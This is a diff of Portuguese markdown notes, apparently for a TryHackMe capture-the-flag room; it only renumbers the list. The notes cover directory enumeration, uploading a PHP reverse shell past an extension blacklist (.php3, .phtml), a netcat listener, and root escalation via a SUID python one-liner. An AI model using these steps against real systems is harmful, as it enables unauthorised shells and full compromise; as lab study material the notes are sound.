@@ -10,24 +10,24 @@
       - Portas
       - Serviços/Protocolos
 
-  II. **Gobuster**
+   II. **Gobuster**
       1. Diretórios Ocultos
          - /panel/
          - /uploads/
 
 2. **Shell Reverso**
 
-   1. **PHP**
+   I. **PHP**
       - /usr/share/laudanum/php/php-reverse-shell.php
       - [Pentest Monkey PHP Reverse Shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 
-   2. **Blacklist Bypass**
+   II. **Blacklist Bypass**
       - .php3
       - .php4
       - .php5
       - .phtml
 
-   3. **Netcat**
+   III. **Netcat**
       - Endereço IP da Rede THM
       - nc -lvnp 4444
  
@@ -35,15 +35,15 @@
 
 3. **Escalação de Privilégio**
 
-   1. **Exploração de Permissão SUID**
+   I. **Exploração de Permissão SUID**
       - /usr/bin/python 
 
       > Solucionado com ajuda de Writeup 
 
-   2. **Python**
+   II. **Python**
       - `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
  
-   3. **Root**
+   III. **Root**
       - `cd /root/`
       - `ls`
       - root.txt
